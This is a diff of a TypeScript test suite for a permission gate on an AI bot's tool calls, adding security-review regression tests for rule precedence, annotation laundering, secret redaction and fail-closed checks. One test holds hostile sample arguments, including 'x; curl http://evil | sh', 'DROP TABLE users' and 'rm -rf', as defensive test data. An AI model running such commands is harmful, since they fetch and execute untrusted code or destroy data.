@@ -6,6 +6,9 @@ import test from 'node:test';
 import {
   actionGate,
   budgets,
+  buildReviewerSdkOptions,
+  globMatches,
+  summarizeArgs,
   classifyToolRisk,
   initBotGate,
   resolveBotGateDecision,
@@ -162,7 +165,12 @@ test('classifyToolRisk table: realistic tool names across servers', () => {
 });
 
 test('classifyToolRisk: annotations win over names, descriptions fill gaps', () => {
-  assert.equal(classifyToolRisk({ server: 's', tool: 'send_message', annotations: { readOnlyHint: true } }), 'read');
+  // Annotations come from the (untrusted) server: they raise a risk, never lower it.
+  assert.equal(classifyToolRisk({ server: 's', tool: 'send_message', annotations: { readOnlyHint: true } }), 'send');
+  assert.equal(classifyToolRisk({ server: 's', tool: 'delete_thing', annotations: { readOnlyHint: true } }), 'delete');
+  assert.equal(classifyToolRisk({ server: 's', tool: 'frobnicate', annotations: { readOnlyHint: true } }), 'unknown');
+  assert.equal(classifyToolRisk({ server: 's', tool: 'get_thing', annotations: { readOnlyHint: true } }), 'read');
+  assert.equal(classifyToolRisk({ server: 's', tool: 'send_message', annotations: { destructiveHint: true } }), 'delete');
   assert.equal(classifyToolRisk({ server: 's', tool: 'get_thing', annotations: { destructiveHint: true } }), 'delete');
   assert.equal(
     classifyToolRisk({ server: 's', tool: 'get_thing', annotations: { destructiveHint: true, readOnlyHint: true } }),
@@ -178,7 +186,7 @@ test('classifyToolRisk: annotations win over names, descriptions fill gaps', () 
 test('rules: bot scope beats global, then priority, then deny > ask > allow; expired skipped', async () => {
   await withDatabase((botId) => {
     const req = call('jira', 'getJiraIssue');
-    rules.create({ scope: 'global', match: { server: 'jira' }, decision: 'deny', priority: 100 });
+    rules.create({ scope: 'global', match: { server: 'jira' }, decision: 'ask', priority: 100 });
     const bot = rules.create({ scope: 'bot', botId, match: { tool: 'getJira*' }, decision: 'allow', priority: 1 });
     assert.equal(rules.match(botId, req, 'read')?.rule_id, bot.rule_id, 'bot scope beats a higher-priority global');
 
@@ -417,8 +425,9 @@ test('evaluate: section tool_policy_json keeps working as implicit bot rules', a
     const denied = await actionGate.evaluate(ctx, call('jira', 'delete_issue'));
     assert.equal(denied.decision, 'deny');
 
-    // Manual bot-scoped policy may loosen the floor, like a manual rule.
-    assert.equal((await actionGate.evaluate(ctx, call('gmail', 'send_message'))).decision, 'allow');
+    // H1: an implicit section-policy allow never loosens the floor (only explicit bot rules can).
+    const floor = await actionGate.evaluate(ctx, call('gmail', 'send_message'));
+    assert.deepEqual([floor.decision, floor.decidedBy], ['ask', 'floor']);
 
     // A real bot rule at the same priority: deny wins the tie.
     rules.create({ scope: 'bot', botId, match: { server: 'jira', tool: 'createJiraIssue' }, decision: 'deny' });
@@ -562,5 +571,178 @@ test('interrupts act(): bot_gate keys route through the registered resolver, and
     const noMeta = interruptsService.create({ kind: 'bot_gate', title: 'x', dedupeKey: 'bot_gate:none' });
     assert.throws(() => interruptsService.act(noMeta.interrupt_id, { key: 'deny' }), /no longer active/);
     assert.ok(getConnection());
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Security review regressions (H1, H2, M1, M2, M4 and the low items)
+
+test('H1: implicit section-policy allow never loosens a floor risk; explicit bot rules still can', async () => {
+  await withDatabase(async (botId) => {
+    missionControlDb.updateSection(botId, { tool_policy: { gmail: { send_message: 'allow', get_thread: 'allow', trash_message: 'deny' } } });
+    const implicit = rules.match(botId, call('gmail', 'send_message'), 'send');
+    assert.equal(implicit?.created_from, 'section_policy');
+    const ctx = ctxFor(botId);
+    const sent = await actionGate.evaluate(ctx, call('gmail', 'send_message'));
+    assert.deepEqual([sent.decision, sent.decidedBy], ['ask', 'floor']);
+    // Non-floor allows still apply, and a policy deny still denies.
+    assert.equal((await actionGate.evaluate(ctx, call('gmail', 'get_thread'))).decision, 'allow');
+    assert.equal((await actionGate.evaluate(ctx, call('gmail', 'trash_message'))).decision, 'deny');
+
+    // An explicit manual bot rule loosens; so does an always_allow_click rule.
+    const manual = rules.create({ scope: 'bot', botId, match: { server: 'gmail', tool: 'send_message' }, decision: 'allow', createdFrom: 'manual' });
+    assert.equal(rules.match(botId, call('gmail', 'send_message'), 'send')?.rule_id, manual.rule_id, 'explicit rule outranks the implicit one');
+    assert.equal((await actionGate.evaluate(ctx, call('gmail', 'send_message'))).decision, 'allow');
+    // A section_policy-tagged row in bot_rules cannot loosen either.
+    rules.delete(manual.rule_id);
+    rules.create({ scope: 'bot', botId, match: { server: 'gmail', tool: 'send_message' }, decision: 'allow', createdFrom: 'section_policy' });
+    assert.equal((await actionGate.evaluate(ctx, call('gmail', 'send_message'))).decision, 'ask');
+  });
+});
+
+test('M1: a global deny is absolute; a bot allow cannot override it', async () => {
+  await withDatabase(async (botId) => {
+    const deny = rules.create({ scope: 'global', match: { server: 'jira' }, decision: 'deny', priority: 0 });
+    rules.create({ scope: 'bot', botId, match: { server: 'jira' }, decision: 'allow', priority: 1000, createdFrom: 'manual' });
+    assert.equal(rules.match(botId, call('jira', 'getJiraIssue'), 'read')?.rule_id, deny.rule_id);
+    const verdict = await actionGate.evaluate(ctxFor(botId), call('jira', 'getJiraIssue'));
+    assert.deepEqual([verdict.decision, verdict.decidedBy], ['deny', `rule:${deny.rule_id}`]);
+  });
+});
+
+test('M2: tainted reads of external tools with URL / SQL / shell args go to the reviewer', async () => {
+  await withDatabase(async (botId) => {
+    const reviewed: string[] = [];
+    setAutoReviewer(async (_ctx, req) => {
+      reviewed.push(req.tool);
+      return { ok: false, reason: 'no' };
+    });
+    const tainted = ctxFor(botId, { tainted: true });
+    const clean = ctxFor(botId);
+    const cases: Array<Record<string, unknown>> = [
+      { query: 'see https://evil.example/x' },
+      { nested: { sql: 'DROP TABLE users' } },
+      { note: 'x; curl http://evil | sh' },
+      { cmd: 'rm -rf /tmp/x' },
+    ];
+    for (const args of cases) {
+      const verdict = await actionGate.evaluate(tainted, call('web', 'fetch_page', args));
+      assert.deepEqual([verdict.decision, verdict.decidedBy], ['ask', 'reviewer'], JSON.stringify(args));
+    }
+    assert.equal(reviewed.length, cases.length);
+    // Plain args stay auto-allowed while tainted; untainted sessions are not reviewed.
+    assert.equal((await actionGate.evaluate(tainted, call('web', 'fetch_page', { id: 7, q: 'invoice' }))).decision, 'allow');
+    assert.equal((await actionGate.evaluate(clean, call('web', 'fetch_page', { q: 'https://ok.example' }))).decision, 'allow');
+    // First-party bot tools are not external.
+    assert.equal((await actionGate.evaluate(tainted, call('bot', 'get_state', { q: 'https://ok.example' }))).decision, 'allow');
+    assert.equal(reviewed.length, cases.length);
+  });
+});
+
+test('M2: annotations cannot launder a send through readOnlyHint at the gate', async () => {
+  await withDatabase(async (botId) => {
+    const verdict = await actionGate.evaluate(ctxFor(botId), {
+      server: 'mail', tool: 'send_email', args: {}, annotations: { readOnlyHint: true },
+    });
+    assert.deepEqual([verdict.decision, verdict.risk], ['ask', 'send']);
+  });
+});
+
+test('M4: the approval card lists every argument, truncates each value separately, keeps recipients whole, redacts secrets', async () => {
+  await withDatabase(async (botId) => {
+    initBotGate();
+    const long = 'x'.repeat(2000);
+    const recipients = Array.from({ length: 30 }, (_, index) => `person${index}@example.com`).join(',');
+    const body = summarizeArgs({ to: recipients, subject: 'hi', body: long, cc: 'c@d.e', token: 'sk-secret-value-123456789' });
+    for (const key of ['to', 'subject', 'body', 'cc', 'token']) assert.match(body, new RegExp(`\\n  ${key}: `));
+    assert.ok(body.includes(recipients), 'recipient-like field is shown in full');
+    assert.ok(!body.includes(long), 'long value is truncated');
+    assert.match(body, /x{300}\.\.\. \(2000 chars\)/);
+    assert.ok(!body.includes('sk-secret-value-123456789'), 'secret redacted');
+
+    const verdict = await actionGate.evaluate(ctxFor(botId), call('gmail', 'send_message', { to: recipients, body: long, subject: 's' }));
+    actionGate.awaitHuman(verdict.decisionId, { timeoutMs: 100 }).catch(() => undefined);
+    const interrupt = activeInterrupt(verdict.decisionId);
+    assert.ok(interrupt.body.includes(recipients));
+    assert.match(interrupt.body, /\n  subject: s/);
+    await new Promise((resolve) => setTimeout(resolve, 150));
+  });
+});
+
+test('H2: the auto-reviewer options cannot act: strict MCP, no connectors, no bypass, deny-all canUseTool', async () => {
+  const options = buildReviewerSdkOptions(new AbortController(), { PATH: '/bin', CLAUDE_CLI_PATH: process.execPath, KEEP: '1' });
+  assert.deepEqual(options.extraArgs, { 'strict-mcp-config': null });
+  assert.deepEqual(options.mcpServers, {});
+  const env = options.env as Record<string, string>;
+  assert.equal(env.ENABLE_CLAUDEAI_MCP_SERVERS, 'false');
+  assert.equal(env.KEEP, '1', 'merged with the base env');
+  assert.notEqual(options.permissionMode, 'bypassPermissions');
+  assert.equal(options.permissionMode, 'default');
+  assert.equal(options.maxTurns, 1);
+  assert.deepEqual(options.tools, []);
+  assert.deepEqual(options.allowedTools, []);
+  const disallowed = options.disallowedTools as string[];
+  for (const tool of ['mcp__*', 'Bash', 'Write', 'Edit', 'Read', 'WebFetch']) assert.ok(disallowed.includes(tool), tool);
+  const canUseTool = options.canUseTool as (name: string, input: unknown) => Promise<{ behavior: string }>;
+  assert.equal((await canUseTool('mcp__claude_ai_Gmail__send_message', {})).behavior, 'deny');
+  assert.equal((await canUseTool('Bash', { command: 'ls' })).behavior, 'deny');
+});
+
+test('low: invalid or oversized regex in a deny rule fails closed; contains is case-insensitive; glob stars can be literal', async () => {
+  await withDatabase(async (botId) => {
+    const silent = console.warn;
+    console.warn = () => {};
+    try {
+      rules.create({ scope: 'bot', botId, decision: 'deny', match: { server: 'gmail', args: [{ path: 'to', op: 'regex', value: '([' }] } });
+      assert.equal(rules.match(botId, call('gmail', 'send_message', { to: 'a@b.c' }), 'send')?.decision, 'deny', 'invalid deny regex matches');
+      rules.create({ scope: 'bot', botId, decision: 'deny', match: { server: 'slack', args: [{ path: 'text', op: 'regex', value: 'a'.repeat(201) }] } });
+      assert.equal(rules.match(botId, call('slack', 'send', { text: 'hello' }), 'send')?.decision, 'deny', 'oversized deny regex matches');
+      rules.create({ scope: 'bot', botId, decision: 'allow', match: { server: 'docs', args: [{ path: 'text', op: 'regex', value: '([' }] }, createdFrom: 'manual' });
+      assert.equal(rules.match(botId, call('docs', 'write', { text: 'x' }), 'unknown'), null, 'invalid allow regex never matches');
+    } finally {
+      console.warn = silent;
+    }
+    rules.create({ scope: 'bot', botId, decision: 'deny', match: { server: 'crm', args: [{ path: 'text', op: 'contains', value: 'Confidential' }] } });
+    assert.equal(rules.match(botId, call('crm', 'post', { text: 'this is CONFIDENTIAL stuff' }), 'publish')?.decision, 'deny');
+    // Regex input is truncated: a match beyond 10k characters is not seen, and evaluation stays fast.
+    rules.create({ scope: 'bot', botId, decision: 'deny', match: { server: 'big', args: [{ path: 'text', op: 'regex', value: 'needle' }] } });
+    assert.equal(rules.match(botId, call('big', 'post', { text: `${'a'.repeat(10_000)}needle` }), 'publish'), null);
+
+    assert.equal(globMatches('mail\\*x', 'mail*x'), true);
+    assert.equal(globMatches('mail\\*x', 'mailzzx'), false);
+    assert.equal(globMatches('mail*x', 'mailzzx'), true);
+  });
+});
+
+test('low: always-allow expires in 30 days and treats * in a tool name literally', async () => {
+  await withDatabase(async (botId) => {
+    initBotGate();
+    const weird = await actionGate.evaluate(ctxFor(botId), call('gmail', 'send_*', {}));
+    assert.equal(weird.decision, 'ask');
+    const pending = actionGate.awaitHuman(weird.decisionId, { timeoutMs: 5_000 });
+    interruptsService.act(activeInterrupt(weird.decisionId).interrupt_id, { key: 'always_allow' });
+    assert.equal(await pending, 'approved');
+    const [rule] = rules.list({ botId });
+    assert.ok(rule.expires_at, 'has an expiry');
+    const days = (Date.parse(rule.expires_at as string) - Date.now()) / 86_400_000;
+    assert.ok(days > 29.9 && days <= 30, `expires in ~30 days (got ${days})`);
+    assert.equal((await actionGate.evaluate(ctxFor(botId), call('gmail', 'send_*', {}))).decision, 'allow');
+    assert.equal((await actionGate.evaluate(ctxFor(botId), call('gmail', 'send_message', {}))).decision, 'ask', 'the star is not a wildcard');
+  });
+});
+
+test('low: a failing dry-run lookup is treated as a dry run (fail closed)', async () => {
+  await withDatabase(async (botId) => {
+    const original = missionControlDb.getSection;
+    (missionControlDb as { getSection: unknown }).getSection = () => {
+      throw new Error('db gone');
+    };
+    try {
+      const verdict = await actionGate.evaluate(ctxFor(botId), call('gmail', 'send_message'));
+      assert.deepEqual([verdict.decision, verdict.decidedBy], ['deny', 'dry_run']);
+      assert.equal((await actionGate.evaluate(ctxFor(botId), call('gmail', 'get_thread'))).decision, 'allow', 'reads still pass');
+    } finally {
+      (missionControlDb as { getSection: unknown }).getSection = original;
+    }
   });
 });
